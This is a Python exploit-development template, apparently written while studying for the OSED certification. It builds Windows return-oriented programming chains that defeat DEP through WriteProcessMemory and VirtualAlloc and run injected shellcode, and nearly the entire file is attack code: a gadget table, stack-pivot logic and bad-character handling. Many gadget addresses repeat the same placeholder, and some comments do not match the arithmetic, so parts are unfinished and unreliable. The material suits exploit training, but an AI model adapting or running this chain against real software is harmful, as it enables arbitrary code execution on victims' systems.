"""
 Win32 API ROP Template

    ██████  ███▄    █  ▒█████   █     █░ ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██
  ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒
  ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█ ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░
    ▒   ██▒▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██
  ▒██████▒▒▒██░   ▓██░░ ████▓▒░░░██▒██▓ ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓
  ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
  ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
  ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░
        ░           ░     ░ ░      ░    ░ ░         ░           ░  ░      ░   ░  ░  ░
                                    Written by: snowcra5h@icloud.com (snowcra5h) 2023

This code was written while studying for EXP-301: Windows User Mode Exploit Development OSED Certification 
https://www.offsec.com/courses/exp-301/

The methods defined here are used to build a Return-Oriented Programming (ROP) chain for injecting and executing shellcode 
using WriteProcessMemory and VirtualAlloc Windows API functions, while also dealing with bad characters.

The 'gadgets' variable referenced in these methods is a dictionary containing addresses of useful instructions (gadgets) 
found in the vulnerable program or loaded libraries.

RetToWriteProcessMemory():
    This method uses the available ROP gadgets to restore the correct stack address, which is modified by the ROP decoder. 
    It populates the 'rop' attribute of the object with corresponding gadget addresses and required values.

RestoreShellCode(eax=0x00, bh=0x11110111):
    This method fixes bad characters in the shellcode. It makes sure that the stack offset is in eax, and it adds the offset 
    of the shellcode to the current stack offset. It also resets the stack in esi, and eax for the next ROP gadget. The eax and 
    bh parameters are default values which can be overridden when calling the function.

BuildRopChainWriteProcessMemory(shellcode):
    This method constructs the ROP chain for WriteProcessMemory. It replaces bad characters in the shellcode, builds the ROP 
    chain for different components of WriteProcessMemory, and calculates the correct offsets.

GetVirtualAllocPlaceHolder():
    This method creates placeholders in the ROP chain for VirtualAlloc parameters.

BuildRopChainVirtualAllocAddress():
    This method builds the ROP chain that eventually leads to placing the VirtualAlloc address at the right spot in the chain.

BuildRopChainShellCodeRet():
    This method calculates the address in the stack where the execution should return after the shellcode is executed and 
    puts it in the right place in the ROP chain.

BuildRopChainShellCodeAddr():
    This method calculates the address in the stack where the shellcode is located and puts it in the right place in the ROP chain.

BuildRopChainDwSize():
    This method sets the size of the region to be allocated by VirtualAlloc and puts it in the right place in the ROP chain.

BuildRopChainFlAllocationType():
    This method sets the type of memory allocation to be performed by VirtualAlloc and puts it in the right place in the ROP chain.

BuildRopChainFlProtect():
    This method sets the memory protection constant for VirtualAlloc and puts it in the right place in the ROP chain.

SwapEsiEspVirtualAlloc():
    This method swaps the contents of ESI and ESP, in order to ensure that VirtualAlloc will be called with the right parameters.

BuildRopChainVirtualAlloc():
    This method constructs the ROP chain for VirtualAlloc by calling the corresponding BuildRopChain methods and swapping ESI and ESP.
"""
from typing import Iterable, Tuple
import logging
from utils import RopChain
import struct

# struct.pack('<L', 0x5249f7)  # xor eax, eax ; pop esi ; ret ; (1 found)
# struct.pack('<L', 0x5107e8)  # push eax ; clc ; pop esi ; pop ebx ; pop ebp ; ret ; (1 found)
# struct.pack('<L', 0x587706)  # inc esi ; ret ; (1 found)
# struct.pack('<L', 0x5e3e6a)  # inc eax ; pop ebp ; ret ; (1 found)
# struct.pack('<L', 0x5c8d6a)  # xor edx, edx ; mov eax, edx ; ret ; (1 found)
# struct.pack('<L', 0x740f46)  # mov eax, esi ; pop esi ; ret ; (1 found)
# struct.pack('<L', 0x6928cd)  # push eax ; or eax, 0x04C48300 ; pop esi ; pop ebx ; ret ; (1 found)
# struct.pack('<L', 0x563284)  # push ecx ; lock pop esi ; ret ; (1 found)
# struct.pack('<L', 0x765837)  # mov eax,  [eax] ; ret ; (1 found)
# struct.pack('<L', 0x402bc6)  # mov esp, ebp ; pop ebp ; ret ; (1 found)
# struct.pack('<L', 0x740f46)  # mov eax, esi ; pop esi ; ret ; (1 found)
# struct.pack('<L', 0x7c1793)  # mov  [eax], ecx ; ret ; (1 found)
# struct.pack('<L', 0x776be3)  # int3 ; ret ; (1 found)

gadgets = {
    "push esp ; push eax ; pop edi ; pop esi ; ret": 0x776be3,
    "push esp ; pop esi ; ret": 0x618ef2,
    "push eax ; pop esi ; ret": 0x776be3,
    "pop ecx ; ret": 0x8c50d7,
    "pop eax ; ret": 0x93100c,
    "mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret": 0x776be3,
    # struct.pack('<L', 0x5721a6)  # mov eax, esi ; pop esi ; ret ; (1 found)
    "mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010": 0x776be3,
    "mov dword ptr [esi], eax ; mov eax, esi ; pop esi ; ret": 0x776be3,
    "mov dword ptr [esi], eax ; pop esi ; ret": 0x776be3,
    "mov eax, esi ; pop esi ; ret": 0x740f46,
    "mov esp, ebp ; pop ebp ; ret": 0x402bc6,
    "mov dword ptr [eax], ecx ; ret": 0x7c1793,
    "mov eax, dword ptr [eax] ; ret": 0x765837,
    "mov dword ptr [esi], eax ; ret": 0x776be3,
    "mov eax, ecx ; ret": 0x723b93,
    "inc eax ; ret": 0x931109,
    # struct.pack('<L', 0x587706)  # inc esi ; ret ; (1 found)
    "inc esi ; retn 0x0003": 0x776be3,
    "add eax, ecx ; ret": 0x776be3,
    "add byte [eax+0x00000001], bh ; ret": 0x776be3,
    "sub eax, ecx ; pop ebx ; ret": 0x776be3,
    "neg eax ; ret": 0x776be3,
    "xchg eax, ebp ; rol bl, 0x0000005F ; xor eax, eax ; pop esi ; ret": 0x776be3,
    "xchg eax, esp ; ret": 0x776be3,
}

ROP_JUNK_VALUE = 0x41414141

class SnowCrashDEP:
    __codeCaveOffset = 0
    __dataSectonOffset = 0
    __wpmAddress = 0

    def __init__(self, badCharMap=None, dllBase=None, dataSection=None, codeCave=None, wpmAddress=None):
        self.rop = RopChain(base=dllBase)
        self.badCharMap = badCharMap
        self.dllBase = dllBase or 0
        self.SetCodeCaveOffset(codeCave)
        self.SetDataSectionOffset(dataSection)
        self.SetWPMAddress(wpmAddress)

        if dataSection is not None:
            self.SetDataSectionOffset(dataSection)

        if codeCave is not None:
            self.SetCodeCaveOffset(codeCave)

        if wpmAddress is not None:
            self.SetWPMAddress(wpmAddress)

    def GetWPMAddress(self):
        return self.__wpmAddress

    def SetWPMAddress(self, wpmAddress):
        self.__wpmAddress = wpmAddress

    def SetDataSectionOffset(self, dataSection):
        self.__dataSectonOffset = dataSection

    def GetDataSectionOffset(self):
        return self.__dataSectonOffset

    def SetCodeCaveOffset(self, codeCave):
        self.__codeCaveOffset = codeCave

    def GetCodeCaveOffset(self):
        return self.__codeCaveOffset

    """
        -------------------------------
        BOOL WriteProcessMemory(
          HANDLE  hProcess,
          LPVOID  lpBaseAddress,
          LPCVOID lpBuffer,
          SIZE_T  nSize,
          SIZE_T  *lpNumberOfBytesWritten
        );
        -------------------------------
      self.rop += b""
      self.rop.append_raw(0x41414141) # WriteProcessMemory address
      self.rop.append_raw(0x42424242) # shellcode return address to return to after WriteProcessMemory is called
      self.rop.append_raw(0xffffffff) # hProcess (pseudo Process handle)
      self.rop.append_raw(0x44444444) # lpBaseAddress (Code cave address)
      self.rop.append_raw(0x45454545) # lpBuffer (shellcode stack address)
      self.rop.append_raw(0x46464646) # nSize (size of shellcode)
      self.rop.append_raw(0x47474747) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
      -------------------------------
    """

    def GetWriteProcessMemorySkeleton(self):
        self.rop += b""
        self.rop.append_raw(self.GetWPMAddress())  # WriteProcessMemory address
        # shellcode return address to return to after WriteProcessMemory is called (Code cave address)
        self.rop.append_raw(self.GetCodeCaveOffset())
        # hProcess (pseudo Process handle)
        self.rop.append_raw(self.GetCodeCaveOffset())
        # lpBaseAddress (Code cave address)
        self.rop.append_raw(0x43434343)
        # lpBuffer (shellcode stack address)
        self.rop.append_raw(0x41414141)
        self.rop.append_raw(0x42424242)  # nSize (size of shellcode)
        # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
        self.rop.append_raw(self.GetDataSectionOffset())

        return len(self.rop.chain)

    def BuildRopChainWriteProcessMemoryHprocessAndLpBaseAddress(self):
        """
            because the stack gets clobbered, we need to store
            the code cave address, and move it to lpBaseAddress
            we also need to put -1 into hProcess for the current process
        """

        # get the address of our stack
        self.rop += gadgets["push esp ; pop esi ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

        # Go to hprocess on the stack
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe8)  # -0x18
        self.rop += gadgets["add eax, ecx ; ret"]

        # get the code cave address and put it into eax
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["mov eax, dword ptr [eax] ; ret"]

        # Put clobbered lpBaseAddress address into ECX
        self.rop += gadgets["mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # junk value for POP ESI
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop.append_raw(ROP_JUNK_VALUE)

        # Put -1 into hProcess
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffff)
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX
        # The current position of our skeleton is in EAX

        # Go to lpBaseAddress
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # move the address for our code cave in ECX to lpBaseAddress
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["mov eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

        return self.rop.chain

    def BuildRopChainWriteProcessMemoryLpBuffer(self):
        # Go to lpBuffer
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put address for lpBuffer into EAX
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xcafebabe)
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0x35014742)  # 0xcafebabe + 0x35014742 = 0x200
        self.rop += gadgets["add eax, ecx ; ret"]

        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

        return self.rop.chain

    def BuildRopChainWriteProcessMemoryNsize(self):
        # Go to nSize param
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put nSize into a register
        self.rop += gadgets["push eax ; pop esi ; ret"]
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xfffff9e0)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; pop edi ; mov eax, esi ; pop esi ; pop ebx ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)  # EDI
        self.rop.append_raw(ROP_JUNK_VALUE)  # ESI
        self.rop.append_raw(ROP_JUNK_VALUE)  # EBX

        return self.rop.chain

    def RetToWriteProcessMemory(self):
        # Put the correct stack address back in eax (rop decoder changed this)
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffec)  # -0x14
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["xchg eax, esp ; ret"]

        return self.rop.chain

    def RestoreShellCode(self, eax=0x00, bh=0x11110111):
        # Make sure we have our stack offset in eax
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # Add the offset of our shellcode to our current stack offset
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffff795 - eax)
        self.rop += gadgets["sub eax, ecx ; pop ebx ; ret"]

        # Get bad character 0x00. From 0xff + 01 = 0x00
        self.rop.append_raw(bh)  # 01 into bh
        self.rop += gadgets["add byte [eax+0x00000001], bh ; ret"]

        # Reset stack in esi, and eax for next rop gadget
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop += gadgets["push eax ; pop esi ; ret"]

        return self.rop.chain

    def BuildRopChainWriteProcessMemory(self, shellcode):
        skeletonLen = self.GetWriteProcessMemorySkeleton()
        self.BuildRopChainWriteProcessMemoryHprocessAndLpBaseAddress()
        self.BuildRopChainWriteProcessMemoryLpBuffer()
        self.BuildRopChainWriteProcessMemoryNsize()

        #for i in range(len(self.badCharMap)):
        #    badShellcodeIndex = self.badCharMap[i]
        #    key = struct.pack('B', shellcode[badShellcodeIndex])
        #    bhVal = REPL_BAD_CHARS[key]
        #    bhVal = (bhVal << 8) | 0x11110011
        #    self.RestoreShellCode(badShellcodeIndex, bhVal)

        print(f"Gadget we want {hex(self.dllBase + 0x0468ee)}")
        self.RetToWriteProcessMemory()

        return (self.rop.chain, skeletonLen)

    """
        -------------------------------
        LPVOID VirtualAlloc(
          LPVOID lpAddress,
          SIZE_T dwSize,
          DWORD  flAllocationType,
          DWORD  flProtect
        );
        -------------------------------
        self.rop += b""
        self.rop.append_raw(0x41414141) # VirtualAlloc address
        self.rop.append_raw(0x42424242) # shellcode return address to return to after VirtualAlloc is called
        self.rop.append_raw(0x43434343) # lpAddress (shellcode address)
        self.rop.append_raw(0x44444444) # dwSize (0x1)
        self.rop.append_raw(0x45454545) # flAllocationType (0x1000)
        self.rop.append_raw(0x46464646) # flProtect (0x40)
        -------------------------------
    """

    def GetVirtualAllocPlaceHolder(self):
        self.rop += b""
        self.rop.append_raw(0x45454545)  # 0x14 dummy VirutalAlloc Address
        self.rop.append_raw(0x46464646)  # 0x10 Shellcode Return Address
        self.rop.append_raw(0x47474747)  # 0x0c dummy Shellcode Address
        self.rop.append_raw(0x48484848)  # 0x08 dummy dwSize
        self.rop.append_raw(0x49494949)  # 0x04 dummy flAllocationType
        self.rop.append_raw(0x51515151)  # 0x0 dummy flProtect

    def BuildRopChainVirtualAllocAddress(self):
        # get the address of our stack
        self.rop += gadgets["push esp ; push eax ; pop edi ; pop esi ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

        # set the stack offset to the start of our GetVirtualAllocPlaceHolder
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe4)  # -0x1C
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the actual address of VirtualAlloc into the current offset for GetVirtualAllocPlaceHolder
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0x5054A221)  # 5054A220 + 1 VirtualAlloc
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffff)  # -1
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["mov eax, dword ptr [eax] ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainShellCodeRet(self):
        # increment the stack to ShellCodeRet
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # This is an offset of cbRopchain + n from the address of [Shellcode Return Address] on the stack.
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffffea4)              # offset
        self.rop += gadgets["sub eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["add eax, ecx ; ret"]

    def BuildRopChainShellCodeAddr(self):
        # increment the stack to ShellCodeAddr
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # This is an offset of from where we are to the address of [Shellcode Return Address] on the stack.
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xfffffea8)  # offset
        self.rop += gadgets["sub eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["add eax, ecx ; ret"]

    def BuildRopChainDwSize(self):
        # increment the stack to dwSize
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the value 0x1000 into our stack address dwSize
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffff)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainFlAllocationType(self):
        # increment the stack to FlAllocationType
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # bp 0x50514394 ".if (@ecx & 0x0`ffffffff) = 0x41414141 {} .else {gc}"
        # put the value 0x1000 into our stack address FlAllocationType
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xbebecebf)
        self.rop += gadgets["mov eax, ecx ; ret"]
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0x41414141)
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)

    def BuildRopChainFlProtect(self):
        # increment the stack to FlProtec
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]
        self.rop += gadgets["inc eax ; ret"]

        # put a copy of our current stack address in esi
        self.rop += gadgets["push eax ; pop esi ; ret"]

        # put the value 0x40 into our stack address FlProtec
        self.rop += gadgets["pop eax ; ret"]
        self.rop.append_raw(0xffffffc0)
        self.rop += gadgets["neg eax ; ret"]
        self.rop += gadgets["mov dword ptr [esi], eax ; ret"]

    def SwapEsiEspVirtualAlloc(self):
        # Assume esi has the stack address at the end of our function call on the stack
        self.rop += gadgets["mov eax, esi ; pop esi ; ret"]
        self.rop.append_raw(ROP_JUNK_VALUE)
        self.rop += gadgets["pop ecx ; ret"]
        self.rop.append_raw(0xffffffe8)  # negative offset value
        self.rop += gadgets["add eax, ecx ; ret"]
        self.rop += gadgets["xchg eax, ebp ; ret"]
        self.rop += gadgets["mov esp, ebp ; pop ebp ; ret"]

    def BuildRopChainVirtualAlloc(self):
        self.BuildRopChainVirtualAllocAddress()
        self.BuildRopChainShellCodeRet()
        self.BuildRopChainShellCodeAddr()
        self.BuildRopChainDwSize()
        self.BuildRopChainFlAllocationType()
        self.BuildRopChainFlProtect()
        self.SwapEsiEspVirtualAlloc()

        self.rop += b"\x90" * 0x24